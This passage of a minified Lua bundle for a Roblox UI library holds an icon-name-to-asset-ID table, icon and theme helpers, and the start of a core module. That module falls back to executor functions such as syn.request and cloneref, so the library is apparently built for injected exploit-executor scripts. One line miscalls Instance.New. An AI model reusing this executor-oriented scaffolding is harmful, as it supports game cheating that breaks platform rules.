	["shield-alert"] = "rbxassetid://114995877719925",
	["shield-ban"] = "rbxassetid://108765041044649",
	["shield-check"] = "rbxassetid://87354736164608",
	["shield-ellipsis"] = "rbxassetid://114794739892123",
	["shield-half"] = "rbxassetid://117842634172647",
	["shield-minus"] = "rbxassetid://89965059528921",
	["shield-off"] = "rbxassetid://133426959132690",
	["shield-plus"] = "rbxassetid://100664857995498",
	["shield-question-mark"] = "rbxassetid://135722075265150",
	["shield-user"] = "rbxassetid://124832775645347",
	["shield-x"] = "rbxassetid://73370117343811",
	["shield"] = "rbxassetid://110987169760162",
	["ship-wheel"] = "rbxassetid://130797795829448",
	["ship"] = "rbxassetid://83995100553930",
	["shirt"] = "rbxassetid://106579555405966",
	["shopping-bag"] = "rbxassetid://71885477293226",
	["shopping-basket"] = "rbxassetid://138646411956433",
	["shopping-cart"] = "rbxassetid://128420521375441",
	["shovel"] = "rbxassetid://102465000512056",
	["shower-head"] = "rbxassetid://75884944024117",
	["shredder"] = "rbxassetid://122125164414463",
	["shrimp"] = "rbxassetid://102625900815307",
	["shrink"] = "rbxassetid://90953687918880",
	["shrub"] = "rbxassetid://127326280714343",
	["shuffle"] = "rbxassetid://132382786975101",
	["sigma"] = "rbxassetid://126884244870899",
	["signal-high"] = "rbxassetid://130436670012270",
	["signal-low"] = "rbxassetid://73674683500458",
	["signal-medium"] = "rbxassetid://125003021367019",
	["signal-zero"] = "rbxassetid://130045332414754",
	["signal"] = "rbxassetid://78424889355261",
	["signature"] = "rbxassetid://114402748013000",
	["signpost-big"] = "rbxassetid://115780185675001",
	["signpost"] = "rbxassetid://106584743791433",
	["siren"] = "rbxassetid://134210267818039",
	["skip-back"] = "rbxassetid://70466132711334",
	["skip-forward"] = "rbxassetid://124844823753990",
	["skull"] = "rbxassetid://137726256442333",
	["slack"] = "rbxassetid://96089719516736",
	["slash"] = "rbxassetid://117792185664263",
	["slice"] = "rbxassetid://95810504278179",
	["sliders-horizontal"] = "rbxassetid://85538382643347",
	["sliders-vertical"] = "rbxassetid://101190569086853",
	["smartphone-charging"] = "rbxassetid://102837532613995",
	["smartphone-nfc"] = "rbxassetid://82326425754446",
	["smartphone"] = "rbxassetid://96623008834511",
	["smile-plus"] = "rbxassetid://131981881472144",
	["smile"] = "rbxassetid://105880397565283",
	["snail"] = "rbxassetid://70904536548363",
	["snowflake"] = "rbxassetid://101235206534566",
	["soap-dispenser-droplet"] = "rbxassetid://77258480479465",
	["sofa"] = "rbxassetid://114427687218324",
	["solar-panel"] = "rbxassetid://132448188047921",
	["soup"] = "rbxassetid://115092551871618",
	["space"] = "rbxassetid://87072088914178",
	["spade"] = "rbxassetid://131444449466462",
	["sparkle"] = "rbxassetid://111044800239623",
	["sparkles"] = "rbxassetid://138635884129147",
	["speaker"] = "rbxassetid://96227183003618",
	["speech"] = "rbxassetid://87013139446349",
	["spell-check-2"] = "rbxassetid://81556731785534",
	["spell-check"] = "rbxassetid://91913483031334",
	["spline-pointer"] = "rbxassetid://84842840956804",
	["spline"] = "rbxassetid://129406685807412",
	["split"] = "rbxassetid://105112438805988",
	["spool"] = "rbxassetid://124541981347743",
	["spotlight"] = "rbxassetid://77571742539344",
	["spray-can"] = "rbxassetid://128372039366326",
	["sprout"] = "rbxassetid://100091687832508",
	["square-activity"] = "rbxassetid://89496630185293",
	["square-arrow-down-left"] = "rbxassetid://108194680296901",
	["square-arrow-down-right"] = "rbxassetid://99403846801050",
	["square-arrow-down"] = "rbxassetid://135962519626588",
	["square-arrow-left"] = "rbxassetid://111671474549238",
	["square-arrow-out-down-left"] = "rbxassetid://125714881756353",
	["square-arrow-out-down-right"] = "rbxassetid://89971003001390",
	["square-arrow-out-up-left"] = "rbxassetid://103759986579087",
	["square-arrow-out-up-right"] = "rbxassetid://91221896066807",
	["square-arrow-right"] = "rbxassetid://113920471701361",
	["square-arrow-up-left"] = "rbxassetid://112424670290693",
	["square-arrow-up-right"] = "rbxassetid://76602291406940",
	["square-arrow-up"] = "rbxassetid://106998604646718",
	["square-asterisk"] = "rbxassetid://89186832353625",
	["square-bottom-dashed-scissors"] = "rbxassetid://79076980104803",
	["square-chart-gantt"] = "rbxassetid://104034017316411",
	["square-check-big"] = "rbxassetid://115320390907184",
	["square-check"] = "rbxassetid://134682053539509",
	["square-chevron-down"] = "rbxassetid://91032307924592",
	["square-chevron-left"] = "rbxassetid://73143404829510",
	["square-chevron-right"] = "rbxassetid://90612077729930",
	["square-chevron-up"] = "rbxassetid://85565910197337",
	["square-code"] = "rbxassetid://81604576616881",
	["square-dashed-bottom-code"] = "rbxassetid://100354801563230",
	["square-dashed-bottom"] = "rbxassetid://101102319625624",
	["square-dashed-kanban"] = "rbxassetid://90388067649847",
	["square-dashed-mouse-pointer"] = "rbxassetid://121016142178467",
	["square-dashed-top-solid"] = "rbxassetid://117157577548540",
	["square-dashed"] = "rbxassetid://136905537847606",
	["square-divide"] = "rbxassetid://99894657101970",
	["square-dot"] = "rbxassetid://116613421354866",
	["square-equal"] = "rbxassetid://110283363706707",
	["square-function"] = "rbxassetid://86075219551088",
	["square-kanban"] = "rbxassetid://114537101260131",
	["square-library"] = "rbxassetid://73810931222081",
	["square-m"] = "rbxassetid://117662700410577",
	["square-menu"] = "rbxassetid://104067089444415",
	["square-minus"] = "rbxassetid://116764432015770",
	["square-mouse-pointer"] = "rbxassetid://76141850603920",
	["square-parking-off"] = "rbxassetid://100857293535141",
	["square-parking"] = "rbxassetid://133116656122387",
	["square-pause"] = "rbxassetid://86608552787615",
	["square-pen"] = "rbxassetid://120239476110475",
	["square-percent"] = "rbxassetid://87111930314567",
	["square-pi"] = "rbxassetid://75383328781618",
	["square-pilcrow"] = "rbxassetid://131854284699367",
	["square-play"] = "rbxassetid://108186325238481",
	["square-plus"] = "rbxassetid://114713264461873",
	["square-power"] = "rbxassetid://129240437805187",
	["square-radical"] = "rbxassetid://132645931868292",
	["square-round-corner"] = "rbxassetid://104592745113567",
	["square-scissors"] = "rbxassetid://110601255612411",
	["square-sigma"] = "rbxassetid://113231244246816",
	["square-slash"] = "rbxassetid://105477013908757",
	["square-split-horizontal"] = "rbxassetid://76095370148660",
	["square-split-vertical"] = "rbxassetid://88589192032058",
	["square-square"] = "rbxassetid://136555087357875",
	["square-stack"] = "rbxassetid://100463396619394",
	["square-star"] = "rbxassetid://94506958703720",
	["square-stop"] = "rbxassetid://80018708472943",
	["square-terminal"] = "rbxassetid://83969264476798",
	["square-user-round"] = "rbxassetid://86484997229302",
	["square-user"] = "rbxassetid://70771214183445",
	["square-x"] = "rbxassetid://125136183850190",
	["square"] = "rbxassetid://86304921356806",
	["squares-exclude"] = "rbxassetid://102345385822324",
	["squares-intersect"] = "rbxassetid://120869602570119",
	["squares-subtract"] = "rbxassetid://131484650948795",
	["squares-unite"] = "rbxassetid://96673080107843",
	["squircle-dashed"] = "rbxassetid://129936702532522",
	["squircle"] = "rbxassetid://82426632573807",
	["squirrel"] = "rbxassetid://112864252085343",
	["stamp"] = "rbxassetid://92370779813368",
	["star-half"] = "rbxassetid://117449275562979",
	["star-off"] = "rbxassetid://75742832732503",
	["star"] = "rbxassetid://136141469398409",
	["step-back"] = "rbxassetid://108672750005121",
	["step-forward"] = "rbxassetid://126131872136145",
	["stethoscope"] = "rbxassetid://122331031702148",
	["sticker"] = "rbxassetid://79938203791608",
	["sticky-note"] = "rbxassetid://111894074643919",
	["store"] = "rbxassetid://90338129673705",
	["stretch-horizontal"] = "rbxassetid://87665042192343",
	["stretch-vertical"] = "rbxassetid://95265463417122",
	["strikethrough"] = "rbxassetid://103417324549613",
	["subscript"] = "rbxassetid://74553514785183",
	["sun-dim"] = "rbxassetid://129141645592715",
	["sun-medium"] = "rbxassetid://130278807964710",
	["sun-moon"] = "rbxassetid://75752898854559",
	["sun-snow"] = "rbxassetid://112791898014579",
	["sun"] = "rbxassetid://110150589884127",
	["sunrise"] = "rbxassetid://134705665494098",
	["sunset"] = "rbxassetid://75904872203588",
	["superscript"] = "rbxassetid://96887696590118",
	["swatch-book"] = "rbxassetid://126786244872453",
	["swiss-franc"] = "rbxassetid://113497920041625",
	["switch-camera"] = "rbxassetid://76841154349737",
	["sword"] = "rbxassetid://124448418211665",
	["swords"] = "rbxassetid://81872698913435",
	["syringe"] = "rbxassetid://123891270479254",
	["table-2"] = "rbxassetid://95751552281545",
	["table-cells-merge"] = "rbxassetid://95363715175258",
	["table-cells-split"] = "rbxassetid://114799086088649",
	["table-columns-split"] = "rbxassetid://111011625447949",
	["table-of-contents"] = "rbxassetid://135044763275414",
	["table-properties"] = "rbxassetid://125062886015372",
	["table-rows-split"] = "rbxassetid://96443733673997",
	["table"] = "rbxassetid://109109148250737",
	["tablet-smartphone"] = "rbxassetid://133680859813404",
	["tablet"] = "rbxassetid://128403991264386",
	["tablets"] = "rbxassetid://80835787970735",
	["tag"] = "rbxassetid://129104970103940",
	["tags"] = "rbxassetid://107179263080798",
	["tally-1"] = "rbxassetid://115301298241643",
	["tally-2"] = "rbxassetid://110363186864027",
	["tally-3"] = "rbxassetid://97655344572540",
	["tally-4"] = "rbxassetid://102633494371890",
	["tally-5"] = "rbxassetid://88031817475886",
	["tangent"] = "rbxassetid://123263132981724",
	["target"] = "rbxassetid://87563802520297",
	["telescope"] = "rbxassetid://91755049143647",
	["tent-tree"] = "rbxassetid://76698322463977",
	["tent"] = "rbxassetid://109779587826330",
	["terminal"] = "rbxassetid://106783148545356",
	["test-tube-diagonal"] = "rbxassetid://75662704378840",
	["test-tube"] = "rbxassetid://98801015650164",
	["test-tubes"] = "rbxassetid://92555361447433",
	["text-align-center"] = "rbxassetid://84051028246390",
	["text-align-end"] = "rbxassetid://130041738343555",
	["text-align-justify"] = "rbxassetid://80279880143030",
	["text-align-start"] = "rbxassetid://134489585487649",
	["text-cursor-input"] = "rbxassetid://107551944047171",
	["text-cursor"] = "rbxassetid://115984654447300",
	["text-initial"] = "rbxassetid://129458097472087",
	["text-quote"] = "rbxassetid://139278366448736",
	["text-search"] = "rbxassetid://92345384671606",
	["text-select"] = "rbxassetid://117087320884956",
	["text-wrap"] = "rbxassetid://114804318314018",
	["theater"] = "rbxassetid://108558145549163",
	["thermometer-snowflake"] = "rbxassetid://121876188028425",
	["thermometer-sun"] = "rbxassetid://106693240074310",
	["thermometer"] = "rbxassetid://106546011492311",
	["thumbs-down"] = "rbxassetid://87794009914015",
	["thumbs-up"] = "rbxassetid://111137070767020",
	["ticket-check"] = "rbxassetid://105428777212507",
	["ticket-minus"] = "rbxassetid://78966299769328",
	["ticket-percent"] = "rbxassetid://80834774406405",
	["ticket-plus"] = "rbxassetid://110086734392189",
	["ticket-slash"] = "rbxassetid://89045681172265",
	["ticket-x"] = "rbxassetid://88674114109926",
	["ticket"] = "rbxassetid://126527071492145",
	["tickets-plane"] = "rbxassetid://100367018248695",
	["tickets"] = "rbxassetid://135268612687833",
	["timer-off"] = "rbxassetid://110916370767271",
	["timer-reset"] = "rbxassetid://110052125369932",
	["timer"] = "rbxassetid://85473888890506",
	["toggle-left"] = "rbxassetid://85887872573050",
	["toggle-right"] = "rbxassetid://90411952142550",
	["toilet"] = "rbxassetid://80930782432931",
	["tool-case"] = "rbxassetid://87533537832522",
	["tornado"] = "rbxassetid://88358291515768",
	["torus"] = "rbxassetid://70855707283051",
	["touchpad-off"] = "rbxassetid://78784008075456",
	["touchpad"] = "rbxassetid://74882354908014",
	["tower-control"] = "rbxassetid://95937619060532",
	["toy-brick"] = "rbxassetid://86293483924633",
	["tractor"] = "rbxassetid://103376704722051",
	["traffic-cone"] = "rbxassetid://74110220470369",
	["train-front-tunnel"] = "rbxassetid://105194827005114",
	["train-front"] = "rbxassetid://125237934215370",
	["train-track"] = "rbxassetid://77451032453723",
	["tram-front"] = "rbxassetid://93315182364998",
	["transgender"] = "rbxassetid://135530817673639",
	["trash-2"] = "rbxassetid://109843431391323",
	["trash"] = "rbxassetid://106723740584310",
	["tree-deciduous"] = "rbxassetid://123124389219004",
	["tree-palm"] = "rbxassetid://103846705893963",
	["tree-pine"] = "rbxassetid://124662547202594",
	["trees"] = "rbxassetid://121203841375919",
	["trello"] = "rbxassetid://130987241149527",
	["trending-down"] = "rbxassetid://139309232226438",
	["trending-up-down"] = "rbxassetid://85083293981691",
	["trending-up"] = "rbxassetid://81819858538839",
	["triangle-alert"] = "rbxassetid://125920361880643",
	["triangle-dashed"] = "rbxassetid://124324079103935",
	["triangle-right"] = "rbxassetid://116930791412791",
	["triangle"] = "rbxassetid://126330486745540",
	["trophy"] = "rbxassetid://131545003268773",
	["truck-electric"] = "rbxassetid://111873446387359",
	["truck"] = "rbxassetid://86662707764771",
	["turkish-lira"] = "rbxassetid://114589876174070",
	["turntable"] = "rbxassetid://129870346487856",
	["turtle"] = "rbxassetid://118295081560334",
	["tv-minimal-play"] = "rbxassetid://99201833426972",
	["tv-minimal"] = "rbxassetid://100382201729427",
	["tv"] = "rbxassetid://135687724791776",
	["twitch"] = "rbxassetid://71383308134888",
	["twitter"] = "rbxassetid://88791703276842",
	["type-outline"] = "rbxassetid://80108627791690",
	["type"] = "rbxassetid://133543553793564",
	["umbrella-off"] = "rbxassetid://72395143739955",
	["umbrella"] = "rbxassetid://127502210274589",
	["underline"] = "rbxassetid://123709229216544",
	["undo-2"] = "rbxassetid://113885292059932",
	["undo-dot"] = "rbxassetid://132055277744844",
	["undo"] = "rbxassetid://111258459077271",
	["unfold-horizontal"] = "rbxassetid://117128358526398",
	["unfold-vertical"] = "rbxassetid://116593025265499",
	["ungroup"] = "rbxassetid://106674800451003",
	["university"] = "rbxassetid://84652528263642",
	["unlink-2"] = "rbxassetid://128131898892572",
	["unlink"] = "rbxassetid://139835795227752",
	["unplug"] = "rbxassetid://90171381619874",
	["upload"] = "rbxassetid://138212042425501",
	["usb"] = "rbxassetid://117230058949613",
	["user-check"] = "rbxassetid://81775205032725",
	["user-cog"] = "rbxassetid://92795491530865",
	["user-lock"] = "rbxassetid://78892639693821",
	["user-minus"] = "rbxassetid://126976941957511",
	["user-pen"] = "rbxassetid://87445472574836",
	["user-plus"] = "rbxassetid://118514469915884",
	["user-round-check"] = "rbxassetid://118794737621941",
	["user-round-cog"] = "rbxassetid://78239503290053",
	["user-round-minus"] = "rbxassetid://98944176636447",
	["user-round-pen"] = "rbxassetid://108155244324878",
	["user-round-plus"] = "rbxassetid://113301899567470",
	["user-round-search"] = "rbxassetid://71565774381870",
	["user-round-x"] = "rbxassetid://122367980560930",
	["user-round"] = "rbxassetid://136485052187963",
	["user-search"] = "rbxassetid://101335649828115",
	["user-star"] = "rbxassetid://98777846316000",
	["user-x"] = "rbxassetid://139748155894754",
	["user"] = "rbxassetid://81589895647169",
	["users-round"] = "rbxassetid://103005444008339",
	["users"] = "rbxassetid://115398113982385",
	["utensils-crossed"] = "rbxassetid://109520762270383",
	["utensils"] = "rbxassetid://139952569804235",
	["utility-pole"] = "rbxassetid://101965541238242",
	["variable"] = "rbxassetid://104743088438151",
	["vault"] = "rbxassetid://108049164599845",
	["vector-square"] = "rbxassetid://86713728565344",
	["vegan"] = "rbxassetid://119489190688082",
	["venetian-mask"] = "rbxassetid://102636443033920",
	["venus-and-mars"] = "rbxassetid://120227752103771",
	["venus"] = "rbxassetid://82891342220859",
	["vibrate-off"] = "rbxassetid://113446447326246",
	["vibrate"] = "rbxassetid://108330910738733",
	["video-off"] = "rbxassetid://132239189859305",
	["video"] = "rbxassetid://107587444636945",
	["videotape"] = "rbxassetid://114816894323398",
	["view"] = "rbxassetid://118717253976805",
	["voicemail"] = "rbxassetid://134313454010227",
	["volleyball"] = "rbxassetid://83889351124153",
	["volume-1"] = "rbxassetid://98514588731639",
	["volume-2"] = "rbxassetid://89344380902620",
	["volume-off"] = "rbxassetid://103047478058767",
	["volume-x"] = "rbxassetid://139252359189540",
	["volume"] = "rbxassetid://103236289817396",
	["vote"] = "rbxassetid://89409762851246",
	["wallet-cards"] = "rbxassetid://129728715308337",
	["wallet-minimal"] = "rbxassetid://137800448816116",
	["wallet"] = "rbxassetid://132331555762628",
	["wallpaper"] = "rbxassetid://74682121235494",
	["wand-sparkles"] = "rbxassetid://82546429942392",
	["wand"] = "rbxassetid://114580617777835",
	["warehouse"] = "rbxassetid://78388887451080",
	["washing-machine"] = "rbxassetid://104194127573858",
	["watch"] = "rbxassetid://130544621618405",
	["waves-ladder"] = "rbxassetid://101808619355514",
	["waves"] = "rbxassetid://96340135183647",
	["waypoints"] = "rbxassetid://102450133666017",
	["webcam"] = "rbxassetid://104148487911129",
	["webhook-off"] = "rbxassetid://96370548093471",
	["webhook"] = "rbxassetid://112812457747322",
	["weight"] = "rbxassetid://103860559844854",
	["wheat-off"] = "rbxassetid://133294844612307",
	["wheat"] = "rbxassetid://85261952080359",
	["whole-word"] = "rbxassetid://90111083954485",
	["wifi-cog"] = "rbxassetid://110500263326209",
	["wifi-high"] = "rbxassetid://81954601342139",
	["wifi-low"] = "rbxassetid://138217335635913",
	["wifi-off"] = "rbxassetid://74113634330106",
	["wifi-pen"] = "rbxassetid://91290205064712",
	["wifi-sync"] = "rbxassetid://84043971055177",
	["wifi-zero"] = "rbxassetid://124286465246123",
	["wifi"] = "rbxassetid://104669375183960",
	["wind-arrow-down"] = "rbxassetid://127753987414870",
	["wind"] = "rbxassetid://114551690399915",
	["wine-off"] = "rbxassetid://108294164302317",
	["wine"] = "rbxassetid://115743721332829",
	["workflow"] = "rbxassetid://99186544029189",
	["worm"] = "rbxassetid://115752311548091",
	["wrench"] = "rbxassetid://112148279212860",
	["x"] = "rbxassetid://110786993356448",
	["youtube"] = "rbxassetid://123663668456341",
	["zap-off"] = "rbxassetid://81385483183652",
	["zap"] = "rbxassetid://130551565616516",
	["zoom-in"] = "rbxassetid://127956924984803",
	["zoom-out"] = "rbxassetid://108334162607319",
	["balloon"] = "rbxassetid://97489111621526",
	["beef-off"] = "rbxassetid://99869959725200",
	["book-search"] = "rbxassetid://132585409504950",
	["calendars"] = "rbxassetid://130944763042289",
	["cannabis-off"] = "rbxassetid://101938500363812",
	["cctv-off"] = "rbxassetid://75925370187295",
	["cigarette"] = "rbxassetid://137149549886852",
	["circle-pile"] = "rbxassetid://116353155251541",
	["cloud-backup"] = "rbxassetid://111649579696132",
	["cloud-sync"] = "rbxassetid://79393911188593",
	["database-search"] = "rbxassetid://92017137080138",
	["ellipse"] = "rbxassetid://71559658267482",
	["fingerprint-pattern"] = "rbxassetid://80934710831288",
	["fishing-hook"] = "rbxassetid://121038780855899",
	["fishing-rod"] = "rbxassetid://71754848048049",
	["form"] = "rbxassetid://72999643971000",
	["git-merge-conflict"] = "rbxassetid://85677801675703",
	["globe-off"] = "rbxassetid://77775243585824",
	["globe-x"] = "rbxassetid://109268097029296",
	["hd"] = "rbxassetid://71682790698278",
	["image"] = "rbxassetid://112751259236831",
	["layers-plus"] = "rbxassetid://77587765623057",
	["lens-concave"] = "rbxassetid://94819631937027",
	["lens-convex"] = "rbxassetid://74736504195474",
	["line-dot-right-horizontal"] = "rbxassetid://104718593155221",
	["line-style"] = "rbxassetid://90176717785772",
	["map-pin-search"] = "rbxassetid://89065012915078",
	["message-circle-check"] = "rbxassetid://132772297689418",
	["message-square-check"] = "rbxassetid://125789987055668",
	["metronome"] = "rbxassetid://101991829345965",
	["mirror-rectangular"] = "rbxassetid://109046769760336",
	["mirror-round"] = "rbxassetid://121534049429097",
	["mouse-left"] = "rbxassetid://99144293708743",
	["mouse-right"] = "rbxassetid://88331710212594",
	["printer-x"] = "rbxassetid://103002721801548",
	["radio-off"] = "rbxassetid://80359258046586",
	["road"] = "rbxassetid://120251329173530",
	["scooter"] = "rbxassetid://100035452787934",
	["search-alert"] = "rbxassetid://127597984617505",
	["shelving-unit"] = "rbxassetid://80116568514793",
	["shield-cog-corner"] = "rbxassetid://111694066132698",
	["shield-cog"] = "rbxassetid://129235695057857",
	["sport-shoe"] = "rbxassetid://120495992692630",
	["square-arrow-right-enter"] = "rbxassetid://138867831495334",
	["square-arrow-right-exit"] = "rbxassetid://133688575845430",
	["square-centerline-dashed-horizontal"] = "rbxassetid://77780104374341",
	["square-centerline-dashed-vertical"] = "rbxassetid://107878435803525",
	["stone"] = "rbxassetid://135161057497830",
	["toolbox"] = "rbxassetid://85341033903792",
	["towel-rack"] = "rbxassetid://125223915620991",
	["user-key"] = "rbxassetid://105403041782190",
	["user-round-key"] = "rbxassetid://124547549008939",
	["van"] = "rbxassetid://122066377022942",
	["waves-arrow-down"] = "rbxassetid://129215220911792",
	["waves-arrow-up"] = "rbxassetid://102314705716217",
	["weight-tilde"] = "rbxassetid://112081212176951",
	["x-line-top"] = "rbxassetid://140592656289509",
	["zodiac-aquarius"] = "rbxassetid://74560047770362",
	["zodiac-aries"] = "rbxassetid://73255859670234",
	["zodiac-cancer"] = "rbxassetid://131985162532947",
	["zodiac-capricorn"] = "rbxassetid://97859568140652",
	["zodiac-gemini"] = "rbxassetid://80997588122992",
	["zodiac-leo"] = "rbxassetid://75509406718106",
	["zodiac-libra"] = "rbxassetid://113222735060218",
	["zodiac-ophiuchus"] = "rbxassetid://129180108892480",
	["zodiac-pisces"] = "rbxassetid://95845819440327",
	["zodiac-sagittarius"] = "rbxassetid://82651026742181",
	["zodiac-scorpio"] = "rbxassetid://113640924054631",
	["zodiac-taurus"] = "rbxassetid://123053219704400",
	["zodiac-virgo"] = "rbxassetid://99462994613661",
}

end)()}}

local function parseIconString(e)
if type(e)=="string"then
local f=e:find":"
if f then
local g=e:sub(1,f-1)
local h=e:sub(f+1)
return g,h
end
end
return nil,e
end

function d.AddIcons(e,f)
if type(e)~="string"or type(f)~="table"then
error"AddIcons: packName must be string, iconsData must be table"
return
end

if not d.Icons[e]then
d.Icons[e]={
Icons={},
Spritesheets={}
}
end

for g,h in pairs(f)do
if type(h)=="number"or(type(h)=="string"and h:match"^rbxassetid://")then
local i=h
if type(h)=="number"then
i="rbxassetid://"..tostring(h)
end

d.Icons[e].Icons[g]={
Image=i,
ImageRectSize=Vector2.new(0,0),
ImageRectPosition=Vector2.new(0,0),
Parts=nil
}
d.Icons[e].Spritesheets[i]=i

elseif type(h)=="table"then
if h.Image and h.ImageRectSize and h.ImageRectPosition then
local i=h.Image
if type(i)=="number"then
i="rbxassetid://"..tostring(i)
end

d.Icons[e].Icons[g]={
Image=i,
ImageRectSize=h.ImageRectSize,
ImageRectPosition=h.ImageRectPosition,
Parts=h.Parts
}

if not d.Icons[e].Spritesheets[i]then
d.Icons[e].Spritesheets[i]=i
end
else
warn("AddIcons: Invalid spritesheet data format for icon '"..g.."'")
end
else
warn("AddIcons: Unsupported data type for icon '"..g.."': "..type(h))
end
end
end

function d.SetIconsType(e)
d.IconsType=e
end

local e
function d.Init(f,g)
d.New=f
d.IconThemeTag=g

e=f
return d
end

function d.Icon(f,g,h)
h=h~=false
local i,j=parseIconString(f)

local l=i or g or d.IconsType
local m=j

local p=d.Icons[l]

if p and p.Icons and p.Icons[m]then
return{
p.Spritesheets[tostring(p.Icons[m].Image)],
p.Icons[m],
}
elseif p and p[m]and string.find(p[m],"rbxassetid://")then
return h and{
p[m],
{ImageRectSize=Vector2.new(0,0),ImageRectPosition=Vector2.new(0,0)}
}or p[m]
end
return nil
end

function d.GetIcon(f,g)
return d.Icon(f,g,false)
end


function d.Icon2(f,g,h)
return d.Icon(f,g,true)
end

function d.Image(f)
local g={
Icon=f.Icon or nil,
Type=f.Type,
Colors=f.Colors or{(d.IconThemeTag or Color3.new(1,1,1)),Color3.new(1,1,1)},
Transparency=f.Transparency or{0,0},
Size=f.Size or UDim2.new(0,24,0,24),

IconFrame=nil,
}

local h={}
local i={}

for j,l in next,g.Colors do
h[j]={
ThemeTag=typeof(l)=="string"and l,
Color=typeof(l)=="Color3"and l,
}
end

for j,l in next,g.Transparency do
i[j]={
ThemeTag=typeof(l)=="string"and l,
Value=typeof(l)=="number"and l,
}
end


local j=d.Icon2(g.Icon,g.Type)
local l=typeof(j)=="string"and string.find(j,'rbxassetid://')

if d.New then
local m=e or d.New



local p=m("ImageLabel",{
Size=g.Size,
BackgroundTransparency=1,
ImageColor3=h[1].Color or nil,
ImageTransparency=i[1].Value or nil,
ThemeTag=h[1].ThemeTag and{
ImageColor3=h[1].ThemeTag,
ImageTransparency=i[1].ThemeTag,
},
Image=l and j or j[1],
ImageRectSize=l and nil or j[2].ImageRectSize,
ImageRectOffset=l and nil or j[2].ImageRectPosition,
})


if not l and j[2].Parts then
for r,u in next,j[2].Parts do
local v=d.Icon(u,g.Type)

m("ImageLabel",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
ImageColor3=h[1+r].Color or nil,
ImageTransparency=i[1+r].Value or nil,
ThemeTag=h[1+r].ThemeTag and{
ImageColor3=h[1+r].ThemeTag,
ImageTransparency=i[1+r].ThemeTag,
},
Image=v[1],
ImageRectSize=v[2].ImageRectSize,
ImageRectOffset=v[2].ImageRectPosition,
Parent=p,
})
end
end

g.IconFrame=p
else
local m=Instance.new"ImageLabel"
m.Size=g.Size
m.BackgroundTransparency=1
m.ImageColor3=h[1].Color
m.ImageTransparency=i[1].Value or nil
m.Image=l and j or j[1]
m.ImageRectSize=l and nil or j[2].ImageRectSize
m.ImageRectOffset=l and nil or j[2].ImageRectPosition


if not l and j[2].Parts then
for p,r in next,j[2].Parts do
local u=d.Icon(r,g.Type)

local v=Instance.New"ImageLabel"
v.Size=UDim2.new(1,0,1,0)
v.BackgroundTransparency=1
v.ImageColor3=h[1+p].Color
v.ImageTransparency=i[1+p].Value or nil
v.Image=u[1]
v.ImageRectSize=u[2].ImageRectSize
v.ImageRectOffset=u[2].ImageRectPosition
v.Parent=m
end
end

g.IconFrame=m
end


return g
end

return d end function a.c()
return function(b)
return{


Primary="Icon",

White=Color3.new(1,1,1),
Black=Color3.new(0,0,0),

Dialog="Accent",

Background="Accent",
BackgroundTransparency=0,
Hover="Text",

PanelBackground="White",
PanelBackgroundTransparency=0.95,

WindowBackground="Background",

WindowShadow="Black",


WindowTopbarTitle="Text",
WindowTopbarAuthor="Text",
WindowTopbarIcon="Icon",
WindowTopbarButtonIcon="Icon",


WindowSearchBarBackground="Dialog",

TabBackground="Hover",
TabBackgroundHover="Hover",
TabBackgroundHoverTransparency=0.97,
TabBackgroundActive="Hover",
TabBackgroundActiveTransparency=0.93,
TabText="Text",
TabTextTransparency=0.3,
TabTextTransparencyActive=0,
TabTitle="Text",
TabIcon="Icon",
TabIconTransparency=0.4,
TabIconTransparencyActive=0.1,
TabBorderTransparency=1,
TabBorderTransparencyActive=0.75,
TabBorder="White",

ElementBackground="Text",
ElementBackgroundTransparency=0.93,
ElementBackgroundHover=b:AddColor("ElementBackground","#ffffff",0.1),
ElementTitle="Text",
ElementDesc="Text",
ElementIcon="Icon",

PopupBackground="Background",
PopupBackgroundTransparency="BackgroundTransparency",
PopupTitle="Text",
PopupContent="Text",
PopupIcon="Icon",

DialogBackground="Dialog",
DialogBackgroundTransparency="BackgroundTransparency",
DialogTitle="Text",
DialogContent="Text",
DialogIcon="Icon",

Toggle="Button",
ToggleBar="White",

Checkbox="Primary",
CheckboxIcon="White",
CheckboxBorder="White",
CheckboxBorderTransparency=0.75,

SliderIcon="Icon",

Slider="Primary",
SliderThumb="White",
SliderIconFrom="SliderIcon",
SliderIconTo="SliderIcon",

ProgressBar="Primary",
ProgressBarTrack="Text",
ProgressBarTrackTransparency=0.9,
ProgressBarText="Text",

Tooltip=Color3.fromHex"4C4C4C",
TooltipText="White",
TooltipSecondary="Primary",
TooltipSecondaryText="White",

TabSectionIcon="Icon",

SectionIcon="Icon",

SectionExpandIcon="Icon",
SectionExpandIconTransparency=0.4,
SectionBox="Text",
SectionBoxTransparency=0.95,
SectionBoxBorder="White",
SectionBoxBorderTransparency=0.75,
SectionBoxBackground="Text",
SectionBoxBackgroundTransparency=0.97,

SearchBarBorder="White",
SearchBarBorderTransparency=0.75,

Notification="Background",
Notification2="White",
Notification2Transparency=0.92,
NotificationTitle="Text",
NotificationTitleTransparency=0,
NotificationContent="Text",
NotificationContentTransparency=0.4,
NotificationDuration="White",
NotificationDurationTransparency=0.95,
NotificationBorder="White",
NotificationBorderTransparency=0.75,

DropdownTabBorder="White",
DropdownTabBackground="ElementBackground",
DropdownBackground="Background",

LabelBackground="White",
LabelBackgroundTransparency=0.95,

ViewportBackground="ElementBackground",
ViewportBackgroundTransparency="ElementBackgroundTransparency",
}
end end function a.d()

local b=(cloneref or clonereference or function(b)
return b
end)

local d=b(game:GetService"RunService")
local e=b(game:GetService"UserInputService")
local f=b(game:GetService"TweenService")
local g=b(game:GetService"LocalizationService")
local h=b(game:GetService"HttpService")

local i=a.load'a'local j=

d.Heartbeat

local l="https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua"

local m=a.load'b'

m.SetIconsType"lucide"

local p

local r
r={
Font="rbxassetid://12187365364",
Localization=nil,
CanDraggable=true,
Theme=nil,
Themes=nil,
Icons=m,
Signals={},
Objects={},
LocalizationObjects={},
UIScale=1,
FontObjects={},
Language=string.match(g.SystemLocaleId,"^[a-z]+"),
Request=http_request or(syn and syn.request)or request,
DefaultProperties={
ScreenGui={
ResetOnSpawn=false,
ZIndexBehavior="Sibling",
},
CanvasGroup={
BorderSizePixel=0,
BackgroundColor3=Color3.new(1,1,1),
},
Frame={
BorderSizePixel=0,
BackgroundColor3=Color3.new(1,1,1),
},
TextLabel={
BackgroundColor3=Color3.new(1,1,1),
BorderSizePixel=0,
Text="",
RichText=true,
TextColor3=Color3.new(1,1,1),
TextSize=14,
},
TextButton={
BackgroundColor3=Color3.new(1,1,1),
BorderSizePixel=0,
Text="",
AutoButtonColor=false,
